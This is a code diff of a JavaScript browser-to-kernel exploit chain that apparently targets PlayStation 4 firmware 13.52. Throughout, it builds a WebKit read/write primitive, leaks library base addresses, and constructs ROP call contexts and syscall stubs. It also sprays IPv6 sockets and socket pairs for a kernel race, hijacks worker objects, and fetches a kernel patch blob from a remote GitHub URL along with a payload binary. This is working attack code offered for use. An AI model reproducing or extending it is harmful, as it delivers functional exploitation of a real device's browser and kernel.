@@ -1,32 +1,15 @@
 // ?v=10 must match mem.js's specifier EXACTLY or core.js builds a second
 // module record and releaseFakeCell() (only call site: mem.js:662) reaches a
 // virgin instance, pinning ~137 MB for the life of the page.
-import { establishPrimitive, dropGroomFootprint } from "./core.mjs?v=15";
-import { installWindowP, pairStatus } from "./mem.mjs?v=15";
+import { establishPrimitive } from "./core.mjs?v=10";
+import { installWindowP, pairStatus } from "./mem.mjs";
 import { int64 } from "./int64.mjs";
 import { offsetsFor } from "./ps4_13.52.mjs";
-import {
-    resolveLibkernel1352, lkAligned, parseHexAddr, measureBases1352,
-} from "./lk_boot_1352.mjs";
 
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
 const lines = [];
-const LOG_CAP = 96;
 let passCount = 0, failCount = 0;
-let logQuiet = false;
-
-function paintLog() {
-    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
-    outEl.innerHTML = lines.map(function (l) {
-        l = esc(l);
-        const c = /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l) ? "bad"
-                : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l) ? "warn"
-                : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l) ? "ok" : "";
-        return c ? '<span class="' + c + '">' + l + "</span>" : l;
-    }).join("\n");
-    outEl.scrollTop = outEl.scrollHeight;
-}
 const params = new URLSearchParams(location.search);
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
 
@@ -63,37 +46,17 @@ function mark(tag, detail) {
 
     const raw = detail;
     detail = terse(detail);
-    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
-    lines.push(line);
-    if (lines.length > LOG_CAP)
-        lines.splice(0, lines.length - LOG_CAP);
+    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
+    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
+    outEl.innerHTML = lines.map(function (l) {
+        l = esc(l);
+        const c = /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l) ? "bad"
+                : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l) ? "warn"
+                : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l) ? "ok" : "";
+        return c ? '<span class="' + c + '">' + l + "</span>" : l;
+    }).join("\n");
+    outEl.scrollTop = outEl.scrollHeight;
     post(tag, raw);
-    if (logQuiet) {
-        stateEl.textContent = line.length > 160 ? line.slice(0, 160) + "..." : line;
-        return;
-    }
-    paintLog();
-}
-
-async function groomCollect(cycles, mb, ms, why, tick) {
-    if (!(cycles > 0)) return 0;
-    let worst = 0;
-    for (let i = 0; i < cycles; ++i) {
-        const c0 = Date.now();
-        if (mb > 0) {
-            let junk = [];
-            for (let k = 0; k < mb; ++k)
-                junk.push(new ArrayBuffer(0x100000));
-            junk.length = 0; junk = null;
-        }
-        await new Promise(r => setTimeout(r, ms));
-        if (tick) tick();
-        const dt = Date.now() - c0;
-        if (dt > worst) worst = dt;
-    }
-    mark("GROOM-COLLECT", "at=" + why + " cycles=" + cycles
-        + " mb=" + mb + " worst_ms=" + worst);
-    return worst;
 }
 
 function trace(tag, detail) { if (VERBOSE) mark(tag, detail); else post(tag, detail); }
@@ -106,7 +69,7 @@ function check(name, ok, detail) {
 function hx(n) { return "0x" + (n >>> 0).toString(16); }
 
 const SYS = { read: 3, write: 4, close: 6, getpid: 20, setuid: 0x17,
-              getuid: 0x18, setreuid: 126, dup: 0x29, sendmsg: 0x1c, recvmsg: 0x1b,
+              getuid: 0x18, dup: 0x29, sendmsg: 0x1c, recvmsg: 0x1b,
               socket: 0x61, netcontrol: 0x63, socketpair: 0x87, kqueue: 0x16a,
               readv: 0x78, writev: 0x79, sysctl: 0xca, pipe: 0x2a, fcntl: 0x5c,
               setsockopt: 0x69, getsockopt: 0x76, sched_yield: 0x14b,
@@ -134,9 +97,7 @@ const PIPEBUF_SIZEOF = 0x18, PIPE_PAGE = 0x4000, FILEDESCENT_SIZE = 8;
 const F_SETFL = 4, O_NONBLOCK = 4;
 const IP6_RTHDR0_SIZE = 8, IN6_ADDR_SIZE = 0x10;
 const NUM_MSG_IOV = 0x17, IOVEC_SIZE = 0x10, MSGHDR_SIZE = 0x30;
-const NUM_IPV6_SOCK_DEFAULT = 0x80;
-const NUM_IOV_WORKER_DEFAULT = 1;
-const NUM_UIO_WORKER_DEFAULT = 1;
+const NUM_IPV6_SOCK = 0x100;
 
 const RTHDR_TAG = 0x13370000;
 const MAX_ROUNDS_TWIN = 10, MAX_ROUNDS_TRIPLET = 500, FIND_TRIPLET_FAST = 5000;
@@ -159,96 +120,74 @@ let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false
 
 let allDone = false;
 
-const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
-
 (async function () {
     let p = null;
     try {
-        logQuiet = params.get("domlog") !== "1";
-        post("CHAIN-BUILD", CHAIN_BUILD);
 
         const NUM_IOV_WORKER = params.has("iov")
-            ? parseInt(params.get("iov"), 10) : NUM_IOV_WORKER_DEFAULT;
+            ? parseInt(params.get("iov"), 10) : 4;
         const NUM_ATTEMPT = params.has("attempts")
             ? parseInt(params.get("attempts"), 10) : 8;
         const NUM_IOV_SPRAY = params.has("spray")
             ? parseInt(params.get("spray"), 10) : 0x100;
-        let { key, off } = offsetsFor(navigator.userAgent);
-        if (off && params.has("expm1")) {
-            const seed = parseInt(params.get("expm1").replace(/^0x/i, ""), 16);
-            if (seed > 0)
-                off = Object.assign({}, off, { wk_expm1_builtin: seed >>> 0 });
-        }
-        post("FW", key || "(not a PS4 UA)");
+        const { key, off } = offsetsFor(navigator.userAgent);
+        mark("FW", key || "(not a PS4 UA)");
         if (key !== "13.52" || !off) {
             state("PS4 13.52 only", "bad");
-            post("FW-REFUSED", "This build is hard-bound to firmware 13.52");
+            mark("FW-REFUSED", "This build is hard-bound to firmware 13.52");
             return;
         }
-        post("FW-STATUS", off.fw_status || "none");
-        const NUM_UIO_PLAN = params.has("uio")
-            ? parseInt(params.get("uio"), 10) : NUM_UIO_WORKER_DEFAULT;
-        const IPV6_PLAN = params.has("ipv6")
-            ? parseInt(params.get("ipv6"), 10) : NUM_IPV6_SOCK_DEFAULT;
-        post("PLAN", "iov_workers=" + NUM_IOV_WORKER + " uio_workers=" + NUM_UIO_PLAN
-            + " ipv6=" + IPV6_PLAN + " attempts=" + NUM_ATTEMPT
+        mark("FW-STATUS", off.fw_status || "none");
+        mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " attempts=" + NUM_ATTEMPT
             + " spray=" + NUM_IOV_SPRAY
-            + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed")
-            + " full=?slots=12000000&g=drain:512&iov=4&uio=4&ipv6=256");
+            + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed"));
 
         let kpatch = null, payload = null;
-        let kernelBlobsLoaded = false;
+        // off.kpatch wins when a firmware shares another's kernel and therefore
+        // its blob -- 12.02 uses 1200.bin. Otherwise derive it from the key.
         const kpatchName = "patches/1352.bin";
         const kpatchRemote = "https://raw.githubusercontent.com/OptiTronOffical/polpNO-use/aec207b31694bb182e032033a1bfab0863c171dd/patches/1352.bin";
         const KPATCH_JMP_SITES = [];
-        post("KPATCH-BLOB", "deferred name=" + kpatchName);
-        post("PAYLOAD-BLOB", "deferred");
-
-        async function ensureKernelBlobs() {
-            if (kernelBlobsLoaded) return;
-            kernelBlobsLoaded = true;
-            try {
-                if (!kpatch) {
-                    let r = await fetch(kpatchName, { cache: "no-store" });
+        try {
+            if (kpatchName) {
+                let r = await fetch(kpatchName, { cache: "no-store" });
+                if (r.ok) kpatch = new Uint8Array(await r.arrayBuffer());
+                if (!kpatch || !kpatch.length) {
+                    r = await fetch(kpatchRemote, { cache: "no-store" });
                     if (r.ok) kpatch = new Uint8Array(await r.arrayBuffer());
-                    if (!kpatch || !kpatch.length) {
-                        r = await fetch(kpatchRemote, { cache: "no-store" });
-                        if (r.ok) kpatch = new Uint8Array(await r.arrayBuffer());
-                    }
-                }
-            } catch (e) { mark("KPATCH-FETCH-THREW", e.message); }
-            if (kpatch && KPATCH_JMP_SITES.length === 0) {
-                for (let i = 0; i + 7 <= kpatch.length; ++i) {
-                    if (kpatch[i] !== 0xc6 || kpatch[i + 1] !== 0x81) continue;
-                    if (kpatch[i + 6] !== 0xeb) continue;
-                    KPATCH_JMP_SITES.push(((kpatch[i + 2]) | (kpatch[i + 3] << 8)
-                        | (kpatch[i + 4] << 16) | (kpatch[i + 5] << 24)) >>> 0);
                 }
             }
-            mark("KPATCH-BLOB", kpatch
-                ? "blob=" + kpatchName + " bytes=" + kpatch.length
-                  + " sites=" + KPATCH_JMP_SITES.length
-                : "blob=" + kpatchName + " MISSING");
-            try {
-                if (!payload) {
-                    const r = await fetch("payload.bin");
-                    if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
-                }
-            } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
-            mark("PAYLOAD-BLOB", payload
-                ? "bytes=" + payload.length + " entry="
-                  + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
-                : "MISSING");
-        }
+        } catch (e) { mark("KPATCH-FETCH-THREW", e.message); }
+        if (kpatch) {
 
-        lines.length = 0;
-        if (outEl) outEl.textContent = "";
+            for (let i = 0; i + 7 <= kpatch.length; ++i) {
+                if (kpatch[i] !== 0xc6 || kpatch[i + 1] !== 0x81) continue;
+                if (kpatch[i + 6] !== 0xeb) continue;
+                KPATCH_JMP_SITES.push(((kpatch[i + 2]) | (kpatch[i + 3] << 8)
+                    | (kpatch[i + 4] << 16) | (kpatch[i + 5] << 24)) >>> 0);
+            }
+        }
+        mark("KPATCH-BLOB", kpatch
+            ? "blob=" + kpatchName + " bytes=" + kpatch.length
+              + " sites=" + KPATCH_JMP_SITES.length
+            : "blob=" + kpatchName + " MISSING");
+        try {
+            const r = await fetch("payload.bin");
+            if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
+        } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
+        mark("PAYLOAD-BLOB", payload
+            ? "bytes=" + payload.length + " entry="
+              + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
+            : "MISSING");
+
         state("running the primitive...", "warn");
         await new Promise(r => setTimeout(r, 0));
 
+        const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
         const carrier = await establishPrimitive({
-            maxAttempts: 2,
-            onEvent: (t, d, a) => post(t, (a != null ? "[" + a + "] " : "") + (d || ""))
+            maxAttempts: 6,
+            onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : trace)
+                (t, (a != null ? "[" + a + "] " : "") + (d || ""))
         });
         // THE EXPERIMENT. Promotion releases the ~137 MB the OOM is made of --
         // proven: PAIR-UP released=13 on 2026-08-16 14:44. But releaseFakeCell()
@@ -316,82 +255,18 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
             mark("SWEEP-SKIPPED", "promoted=" + pairStatus.promoted
                 + " cycles=" + SWEEP_CYCLES);
         }
-        {
-            const gd = dropGroomFootprint();
-            mark("GROOM-DROP-CHAIN", "dropped=" + (gd.dropped ? 1 : 0)
-                + (gd.reason ? " reason=" + gd.reason : ""));
-            const COLLECT_CYCLES = params.has("collect")
-                ? parseInt(params.get("collect"), 10) : 0;
-            const COLLECT_MB = params.has("collectmb")
-                ? parseInt(params.get("collectmb"), 10) : 0;
-            const COLLECT_MS = params.has("collectms")
-                ? parseInt(params.get("collectms"), 10) : 55;
-            if (COLLECT_CYCLES > 0)
-                await groomCollect(COLLECT_CYCLES, COLLECT_MB, COLLECT_MS,
-                    "post-groom-drop", null);
-        }
         mark("PRIMITIVE-OK", "");
 
-        const meas = measureBases1352(p, off);
-        mark("MEASURE-13.52", meas.verdict + " " + meas.detail);
-        if (meas.measExpm1 && meas.measExpm1 !== off.wk_expm1_builtin) {
-            off = Object.assign({}, off, { wk_expm1_builtin: meas.measExpm1 });
-            mark("EXPM1-RVA-UPDATE", "seed=0x" + (off.wk_expm1_builtin >>> 0).toString(16)
-                + " live=0x" + meas.measExpm1.toString(16));
-        }
-
         const cell = p.leakval(Math.expm1);
-        const nativeFn = meas.nativeFn || p.read8(p.read8(cell.add32(0x18))
+        const nativeFn = p.read8(p.read8(cell.add32(0x18))
             .add32(off.wk_JSFunction_m_function));
-        let webkitBase = meas.webkit || nativeFn.sub32(off.wk_expm1_builtin);
-        if (params.has("webkit")) {
-            const forced = parseHexAddr(params.get("webkit"));
-            if (forced) {
-                webkitBase = forced;
-                mark("BASES-OVERRIDE", "webkit=" + webkitBase + " (URL — ASLR rotates; prefer expm1 RVA)");
-            }
-        }
-
-        let libkernelBase = meas.libkernel;
-        let lkVia = meas.libkernel ? "text-magic-walk" : "";
-        let lkErr = "";
-        if (!libkernelBase) {
-            const lkRes = resolveLibkernel1352(p, webkitBase, off, {
-                fnPtrHex: params.get("lkfn") || params.get("lk"),
-            });
-            libkernelBase = lkRes.ok ? lkRes.lk : null;
-            lkVia = lkRes.via || "";
-            lkErr = lkRes.error || "";
-        }
-        if (!libkernelBase && params.has("lkbase")) {
-            const forcedLk = parseHexAddr(params.get("lkbase"));
-            if (forcedLk && lkAligned(forcedLk)) {
-                libkernelBase = forcedLk;
-                lkVia = "url-lkbase";
-                mark("BASES-OVERRIDE", "libkernel=" + libkernelBase + " (URL lkbase — debug only)");
-            }
-        }
-        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase
-            + (meas.webkit ? " webkit=measured" : "")
-            + (meas.libkernel ? " libkernel=measured" : "")
-            + (lkVia ? " via=" + lkVia : "")
-            + (lkErr ? " err=" + lkErr : ""));
-        const aligned = v => v && v.hi > 0 && lkAligned(v);
+        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
+        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
+        const libkernelBase = errorFn.sub32(off.k__error);
+        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
+        const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
         if (!check("module-bases-0x4000-aligned",
             aligned(webkitBase) && aligned(libkernelBase), "")) return;
-
-        let errImport = meas.errImport;
-        if (!errImport && webkitBase) {
-            const impRva = (typeof off.wk___imp___error === "number" && off.wk___imp___error > 0)
-                ? off.wk___imp___error : 0x3cb8cc8;
-            try { errImport = p.read8(webkitBase.add32(impRva)); } catch (_) { }
-        }
-        let errorFn = null;
-        if (libkernelBase && off.k__error)
-            errorFn = libkernelBase.add32(off.k__error);
-        if ((!errorFn || errorFn.hi === 0) && errImport && errImport.hi > 0)
-            errorFn = errImport;
-        mark("ERRNO-FN", errorFn ? String(errorFn) : "MISSING");
 
         const G = {};
         const GAD = [
@@ -432,7 +307,6 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
             for (const numStr in off.k_stubs) {
                 const num = +numStr, o = off.k_stubs[numStr];
                 const v = p.read8(libkernelBase.add32(o));
-                if (!v) continue;
                 if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
                 if ((((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0) !== num) continue;
                 stubAddr.set(num, libkernelBase.add32(o)); seeded++;
@@ -443,7 +317,6 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
         let scanned = 0;
         for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
             const v = p.read8(libkernelBase.add32(o));
-            if (!v) continue;
             if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
             const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
             if (!need.has(num)) continue;
@@ -464,24 +337,20 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
                 dv.setUint32(at, v >>> 0, true);
                 dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
             } else {
-                if (!v || typeof v.low !== "number" || typeof v.hi !== "number")
-                    throw new Error("put: bad int64 at 0x" + at.toString(16));
                 dv.setUint32(at, v.low >>> 0, true);
                 dv.setUint32(at + 4, v.hi >>> 0, true);
             }
         }
         const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
-        function makeCtx(retain) {
+        function makeCtx() {
             const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE);
             const kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
+            keepAlive.push(sb, pb, kb, fb);
             const c = { storeDv: new DataView(sb), pivotDv: new DataView(pb),
                 stackDv: new DataView(kb), frameDv: new DataView(fb),
                 stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb) };
-            if (retain !== false) {
-                keepAlive.push(sb, pb, kb, fb);
-                keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv,
-                    c.stackU8, c.frameU8);
-            }
+            keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv,
+                c.stackU8, c.frameU8);
             c.S = bufAddr(sb); c.P = bufAddr(pb);
             c.K = bufAddr(kb); c.F = bufAddr(fb);
             put(c.storeDv, 0x00, G.G1); put(c.storeDv, 0x08, c.P);
@@ -525,14 +394,8 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
                      hi: M.frameDv.getUint32(4, true),
                      i32: M.frameDv.getUint32(0, true) | 0 };
         }
-        const sc = (num, ...a) => {
-            const stub = stubAddr.get(num);
-            if (!stub)
-                throw new Error("missing syscall stub num=0x" + (num >>> 0).toString(16));
-            return callAddr(stub, a);
-        };
+        const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
         function errno() {
-            if (!errorFn) return -1;
             const r = callAddr(errorFn, []);
             const a = new int64(r.lo, r.hi);
             return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
@@ -612,118 +475,60 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
             return got;
         }
         function netevent(sock, event) {
-            return neteventSlot(-1, sock, event);
-        }
-        function spraySockpair() {
-            argDv.setUint32(0, 0, true); argDv.setUint32(4, 0, true);
-            const r = sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32;
-            if (r !== 0) return 0;
-            return argDv.getInt32(0, true);
-        }
-        function credSwapTwice() {
-            const preferReuid = params.get("setuid") !== "1";
-            if (preferReuid && stubAddr.has(SYS.setreuid)) {
-                const r1 = sc(SYS.setreuid, 1, 1).i32;
-                const r2 = sc(SYS.setreuid, 1, 1).i32;
-                mark("CRED-SWAP", "setreuid(1,1)x2 rv=" + r1 + "," + r2
-                    + " uid=" + sc(SYS.getuid).i32);
-                return r1 !== -1 && r2 !== -1;
-            }
-            const r1 = sc(SYS.setuid, 1).i32;
-            const r2 = sc(SYS.setuid, 1).i32;
-            mark("CRED-SWAP", "setuid(1)x2 rv=" + r1 + "," + r2
-                + " (browser uid=1: often no-op — try default setreuid or ?probe=credswap)");
-            return r1 !== -1 && r2 !== -1;
-        }
-        /** Poops.java slot fallback: ifindex -1 then 1; CLEAR must use same slot. */
-        function neteventSlot(slot, sock, event) {
             argDv.setUint32(0, sock >>> 0, true); argDv.setUint32(4, 0, true);
-            const r = sc(SYS.netcontrol, slot, event, argAddr, 8).i32;
+            const r = sc(SYS.netcontrol, -1, event, argAddr, 8).i32;
             return { rv: r, err: r === -1 ? errno() : 0 };
         }
 
-        let iovAb, msgAb, iovAddr, msgAddr, iovDv, msgDv;
-        let iovSs, uioSs, masterPipe, slavePipe;
-        let dummyAb, dummyAddr, uioIovAb, uioIovAddr, uioIovDv;
-        let karwReady = false;
-        function ensureKarwSetup() {
-            if (karwReady) return;
-            iovAb = new ArrayBuffer(IOVEC_SIZE * NUM_MSG_IOV);
-            msgAb = new ArrayBuffer(MSGHDR_SIZE);
-            keepAlive.push(iovAb, msgAb);
-            iovAddr = bufAddr(iovAb); msgAddr = bufAddr(msgAb);
-            iovDv = new DataView(iovAb); msgDv = new DataView(msgAb);
-            new Uint8Array(iovAb).fill(0);
-            put(iovDv, 0, 1);
-            put(iovDv, 8, 1);
-            new Uint8Array(msgAb).fill(0);
-            put(msgDv, 0x10, iovAddr);
-            msgDv.setInt32(0x18, NUM_MSG_IOV, true);
-            if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
-                throw new Error("socketpair failed");
-            iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
-            if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
-                throw new Error("uio socketpair failed");
-            uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
-            post("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(","));
-            if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("master pipe failed");
-            masterPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
-            if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("slave pipe failed");
-            slavePipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
-            check("karw-pipe-pairs-exist",
-                masterPipe[0] > 0 && masterPipe[1] > 0
-                && slavePipe[0] > 0 && slavePipe[1] > 0,
-                "master " + masterPipe + "  slave " + slavePipe);
-            dummyAb = new ArrayBuffer(0x1000); keepAlive.push(dummyAb);
-            new Uint8Array(dummyAb).fill(0x41);
-            dummyAddr = bufAddr(dummyAb);
-            uioIovAb = new ArrayBuffer(IOVEC_SIZE * NUM_UIO_IOV);
-            keepAlive.push(uioIovAb);
-            uioIovAddr = bufAddr(uioIovAb); uioIovDv = new DataView(uioIovAb);
-            new Uint8Array(uioIovAb).fill(0);
-            put(uioIovDv, 0, dummyAddr);
-            karwReady = true;
-        }
+        const iovAb = new ArrayBuffer(IOVEC_SIZE * NUM_MSG_IOV);
+        const msgAb = new ArrayBuffer(MSGHDR_SIZE);
+        keepAlive.push(iovAb, msgAb);
+        const iovAddr = bufAddr(iovAb), msgAddr = bufAddr(msgAb);
+        const iovDv = new DataView(iovAb), msgDv = new DataView(msgAb);
+
+        new Uint8Array(iovAb).fill(0);
+        put(iovDv, 0, 1);
+        put(iovDv, 8, 1);
+        new Uint8Array(msgAb).fill(0);
+        put(msgDv, 0x10, iovAddr);
+        msgDv.setInt32(0x18, NUM_MSG_IOV, true);
+
+        state("setting up...", "warn");
+        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
+            throw new Error("socketpair failed");
+        const iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
+        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
+            throw new Error("uio socketpair failed");
+        const uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
+        mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(","));
+
+        if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("master pipe failed");
+        const masterPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
+        if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("slave pipe failed");
+        const slavePipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
+        check("karw-pipe-pairs-exist",
+            masterPipe[0] > 0 && masterPipe[1] > 0
+            && slavePipe[0] > 0 && slavePipe[1] > 0,
+            "master " + masterPipe + "  slave " + slavePipe);
+
+        const dummyAb = new ArrayBuffer(0x1000); keepAlive.push(dummyAb);
+        new Uint8Array(dummyAb).fill(0x41);
+        const dummyAddr = bufAddr(dummyAb);
+        const uioIovAb = new ArrayBuffer(IOVEC_SIZE * NUM_UIO_IOV);
+        keepAlive.push(uioIovAb);
+        const uioIovAddr = bufAddr(uioIovAb), uioIovDv = new DataView(uioIovAb);
+
+        new Uint8Array(uioIovAb).fill(0);
+        put(uioIovDv, 0, dummyAddr);
         const ipv6 = [];
-        let NUM_IPV6_SOCK = NUM_IPV6_SOCK_DEFAULT;
-        if (params.has("ipv6")) {
-            const n = parseInt(params.get("ipv6"), 10);
-            if (n >= 0x40 && n <= 0x100) NUM_IPV6_SOCK = n;
+        for (let i = 0; i < NUM_IPV6_SOCK; ++i) {
+            const s = sc(SYS.socket, AF_INET6, SOCK_STREAM, 0).i32;
+            if (s === -1) break;
+            ipv6.push(s);
         }
-        async function openIpv6FdBatch(why) {
-            ipv6.length = 0;
-            dropGroomFootprint();
-            let eno = 0;
-            for (let i = 0; i < NUM_IPV6_SOCK; ++i) {
-                const s = sc(SYS.socket, AF_INET6, SOCK_STREAM, 0).i32;
-                if (s === -1) {
-                    eno = errno();
-                    post("IPV6-SOCK-FAIL", why + " i=" + i + " err=" + eno);
-                    break;
-                }
-                ipv6.push(s);
-                if ((i & 15) === 15) sc(SYS.sched_yield);
-            }
-            post("IPV6-OPEN", why + " " + ipv6.length + "/" + NUM_IPV6_SOCK
-                + (eno ? " err=" + eno : ""));
-            return { n: ipv6.length, eno: eno };
-        }
-        function closeIpv6FdBatch(why) {
-            let closed = 0;
-            for (let i = 0; i < ipv6.length; ++i) {
-                if (ipv6[i] > 0) { sc(SYS.close, ipv6[i]); closed++; }
-            }
-            ipv6.length = 0;
-            post("IPV6-CLOSED", why + " n=" + closed);
-        }
-        async function openIpv6ReclaimSockets() {
-            lines.length = 0;
-            if (outEl) outEl.textContent = "";
-            for (let y = 0; y < 4; ++y) sc(SYS.sched_yield);
-            const r = await openIpv6FdBatch("reclaim");
-            check("reclaim-sockets-open", r.n === NUM_IPV6_SOCK,
-                r.n + "/" + NUM_IPV6_SOCK + (r.eno ? " err=" + r.eno : ""));
-        }
+        check("reclaim-sockets-open", ipv6.length === NUM_IPV6_SOCK,
+            ipv6.length + "/" + NUM_IPV6_SOCK);
+
         function makeRpc(w, name) {
             let seq = 0;
             const pending = new Map();
@@ -737,8 +542,7 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
                 else slot.resolve(d.value);
             };
             w.onerror = e => mark("WORKER-ONERROR", name + " "
-                + ((e && e.message) ? e.message : "load-failed (check rpc_worker.js)"));
-            w.onmessageerror = () => mark("WORKER-MSG-ERROR", name);
+                + ((e && e.message) ? e.message : String(e)));
 
             return function call(fname, timeoutMs, ...args) {
                 return new Promise(function (resolve, reject) {
@@ -755,23 +559,58 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
         function ptrish(v) { return v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0; }
 
         const NUM_UIO_WORKER = params.has("uio")
-            ? parseInt(params.get("uio"), 10) : NUM_UIO_WORKER_DEFAULT;
+            ? parseInt(params.get("uio"), 10) : 4;
         const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
+        state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
+        for (let i = 0; i < TOTAL_WORKERS; ++i) {
+            const name = (i < NUM_IOV_WORKER ? "iov" : "uio")
+                + (i < NUM_IOV_WORKER ? i : i - NUM_IOV_WORKER);
+            const w = { name: name, armed: false, wired: false };
+            workers.push(w);
+            w.worker = new Worker("rpc_worker.js");
+            w.rpc = makeRpc(w.worker, name);
+            if ((await w.rpc("ping", 15000)) !== "pong")
+                throw new Error(name + " did not answer ping");
+            const sLo = (0x10100000 | i) >>> 0, sHi = (0xc0de0000 | i) >>> 0;
+            const arr = await w.rpc("init", 15000, sLo, sHi);
+            keepAlive.push(arr);
+            const D = bufAddr(arr.buffer);
+            if ((p.read4(D) >>> 0) !== sLo)
+                throw new Error(name + ": transfer did not preserve the store");
+            const storage = p.read8(D.add32(0x10));
+            const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
+            if (!mc || !ptrish(mc)) throw new Error(name + ": walk failed");
+            const bf = p.read8(mc.add32(8));
+            let wm = null, wv = null, wl = null;
+            for (let k = 1; k <= 8; ++k) {
+                const val = p.read8(bf.sub32(8 * k));
+                if (!ptrish(val)) continue;
+                const inl = p.read8(val.add32(0x10));
+                const len = p.read4(val.add32(0x18)) >>> 0;
+                if (inl.hi === 0 && inl.low === 2) { if (!wl) wl = val; }
+                else if (inl.hi > 0 && len === 6) { if (!wm) wm = val; }
+                else if (inl.hi > 0 && len === 0x30) { if (!wv) wv = val; }
+            }
+            if (!(wm && wv && wl)) throw new Error(name + ": shapes not found");
+            w.master = wm; w.origVector = p.read8(wm.add32(0x10));
+            p.write8(wm.add32(0x10), wv); w.wired = true;
+            await w.rpc("setup", 15000, wl.low, wl.hi);
+            await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
+            w.armed = true;
+            w.ctx = makeCtx();
+        }
+        check("worker-came-arw",
+            workers.length === TOTAL_WORKERS,
+            workers.length + "/" + TOTAL_WORKERS);
+        const iovWorkers = workers.slice(0, NUM_IOV_WORKER);
+        const uioWorkers = workers.slice(NUM_IOV_WORKER);
+        mark("WORKER-POOLS", "iov=" + iovWorkers.length
+            + " uio=" + uioWorkers.length);
 
         const prioAb = new ArrayBuffer(8), maskAb = new ArrayBuffer(0x10);
         keepAlive.push(prioAb, maskAb);
         const prioAddr = bufAddr(prioAb), maskAddr = bufAddr(maskAb);
         const prioDv = new DataView(prioAb), maskDv = new DataView(maskAb);
-
-        function fireW(w, num, args, timeoutMs) {
-            if (!w.ctx) w.ctx = makeCtx(false);
-            const stub = stubAddr.get(num);
-            if (!stub)
-                throw new Error("fireW: missing stub num=0x" + (num >>> 0).toString(16));
-            layout(w.ctx, stub, args);
